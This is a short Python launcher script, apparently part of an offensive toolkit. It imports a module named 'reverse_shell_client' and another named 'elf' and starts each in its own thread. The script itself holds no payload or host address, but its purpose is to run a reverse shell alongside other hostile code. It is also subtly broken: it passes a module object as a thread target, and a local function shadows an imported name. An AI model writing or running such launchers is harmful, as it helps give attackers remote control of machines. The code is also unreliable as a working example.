import threading
import TheSilent.elf as elf
import WifiOrca.reverse_shell_client as reverse_shell_client

def elf():
    import TheSilent.elf

if __name__ == "__main__":
    elf_thread = threading.Thread(target=elf).start()
    reverse_shell_client_thread = threading.Thread(target=reverse_shell_client).start()

